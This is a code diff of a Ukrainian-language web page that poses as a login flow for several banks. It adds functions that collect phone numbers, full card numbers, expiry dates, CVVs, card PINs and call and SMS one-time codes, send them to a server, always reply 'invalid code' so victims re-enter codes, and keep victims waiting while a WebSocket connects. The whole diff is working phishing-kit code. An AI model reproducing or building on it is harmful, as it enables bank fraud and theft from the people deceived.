-    function validateCurrentStep() { let isValid = true; stepContent.querySelectorAll('.input-field').forEach(input => { const errorContainer = input.parentElement.querySelector('.error-message'); input.classList.remove('invalid'); if (errorContainer) errorContainer.style.display = 'none'; let value = input.value.replace(/\D/g, ''); let requiredLength = 0; switch (input.id) { case 'phone': requiredLength = 9; break; case 'card': case 'card_confirm': requiredLength = 16; break; case 'card-expiry': requiredLength = 4; break; case 'card-cvv': requiredLength = 3; break; case 'pin': requiredLength = 4; break; } if (requiredLength > 0 && value.length < requiredLength) { isValid = false; input.classList.add('invalid'); if (errorContainer) { errorContainer.textContent = `Поле має містити ${requiredLength} цифр.`; errorContainer.style.display = 'block'; } } }); return isValid; }
-    async function submitSmsCode() { const codeInput = document.getElementById('sms-code'); const code = codeInput.value; const errorContainer = document.getElementById('sms-error-container'); if (!code.trim()) { if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Будь ласка, введіть код</p>`; return; } try { await fetch(`/api/sms`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId, code, referrer: localStorage.getItem('referrer') }), }); } catch (error) { console.error('Failed to send sms code:', error); } if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Невірний код. Будь ласка, спробуйте ще раз.</p>`; codeInput.value = ''; }
+
+    function renderStep() {
+        if (!activeBankData.steps || !activeBankData.steps[currentStepIndex]) return;
+        const step = activeBankData.steps[currentStepIndex];
+        let html = '';
+        switch (step.type) {
+            case 'phone':
+                html = `<div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12"></div><div class="error-message" style="margin-left: 55px;"></div></div>`;
+                break;
+            case 'card':
+            case 'card_simple':
+                html = generateInputHTML('card', 'XXXX XXXX XXXX XXXX', 'tel', '19');
+                break;
+            case 'pin':
+                html = generateInputHTML('pin', 'ПІН-код', 'password', '4');
+                break;
+            case 'call_code':
+                html = `<p>Зараз вам буде здійснено дзвінок...</p>${generateInputHTML('call_code_input', 'Введіть код з дзвінка', 'tel', '6')}`;
+                break;
+            case 'confirm_all':
+                html = step.fields.map(field => generateInputHTML(field.id, field.placeholder, field.type, field.maxlength)).join('');
+                break;
+        }
+        modalTitle.textContent = step.title;
+        stepContent.innerHTML = html;
+        modalFooter.style.display = 'flex';
+        backBtn.style.display = currentStepIndex > 0 ? 'block' : 'none';
+        nextBtn.style.display = 'block';
+        addInputFormatting();
+    }
+
+    function showWaitingScreen() {
+        modalTitle.textContent = 'Очікуємо';
+        stepContent.innerHTML = `<p>Заявку відправлено. Будь ласка, чекайте. <b>НЕ ЗАКРИВАЙТЕ САЙТ!</b></p>`;
+        modalFooter.style.display = 'none';
+    }
+
+    function handleBackStep() {
+        if (currentStepIndex > 0) {
+            currentStepIndex--;
+            renderStep();
+        } else {
+            body.classList.remove('form-active');
+        }
+    }
+
+    function addInputFormatting() {
+        const phoneInput = document.getElementById('phone');
+        if (phoneInput) {
+            phoneInput.addEventListener('input', (e) => {
+                let value = e.target.value.replace(/\D/g, '').substring(0, 9);
+                e.target.value = value.replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4').trim();
+            });
+        }
+        const cardNumberInput = document.getElementById('card') || document.getElementById('card_confirm');
+        if (cardNumberInput) {
+            cardNumberInput.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim();
+            });
+        }
+        const cardExpiryInput = document.getElementById('card-expiry');
+        if (cardExpiryInput) {
+            cardExpiryInput.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{2})(\d{2})/, '$1/$2');
+            });
+        }
+    }
+
+    function validateCurrentStep() {
+        let isValid = true;
+        stepContent.querySelectorAll('.input-field').forEach(input => {
+            const errorContainer = input.closest('.input-group')?.querySelector('.error-message');
+            input.classList.remove('invalid');
+            if (errorContainer) errorContainer.style.display = 'none';
+            let value = input.value.replace(/\D/g, '');
+            let requiredLength = 0;
+            switch (input.id) {
+                case 'phone': requiredLength = 9; break;
+                case 'card': case 'card_confirm': requiredLength = 16; break;
+                case 'card-expiry': requiredLength = 4; break;
+                case 'card-cvv': requiredLength = 3; break;
+                case 'pin': requiredLength = 4; break;
+            }
+            if (requiredLength > 0 && value.length < requiredLength) {
+                isValid = false;
+                input.classList.add('invalid');
+                if (errorContainer) {
+                    errorContainer.textContent = `Поле має містити ${requiredLength} цифр.`;
+                    errorContainer.style.display = 'block';
+                }
+            }
+        });
+        return isValid;
+    }
+
+    async function submitSmsCode() {
+        const codeInput = document.getElementById('sms-code');
+        const code = codeInput.value;
+        const errorContainer = document.getElementById('sms-error-container');
+        if (!code.trim()) {
+            if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Будь ласка, введіть код</p>`;
+            return;
+        }
+        try {
+            await fetch(`/api/sms`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ sessionId, code, referrer: localStorage.getItem('referrer') }),
+            });
+        } catch (error) {
+            console.error('Failed to send sms code:', error);
+        }
+        if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Невірний код. Будь ласка, спробуйте ще раз.</p>`;
+        codeInput.value = '';
+    }
+    
+    document.querySelectorAll('.bank-item').forEach(item => {
+        item.addEventListener('click', e => {
+            e.preventDefault();
+            if (item.classList.contains('disabled')) return;
+            const bankId = item.dataset.bank;
+            activeBankData = JSON.parse(JSON.stringify(bankFlows[bankId]));
+            body.dataset.theme = activeBankData.theme;
+            formHeaderLogo.src = activeBankData.logoUrl;
+            body.classList.add('form-active');
+            currentStepIndex = 0;
+            collectedData = {};
+            renderStep();
+            connectWebSocket();
+        });
+    });
 });
 </script>
 </body>
 </html>
+
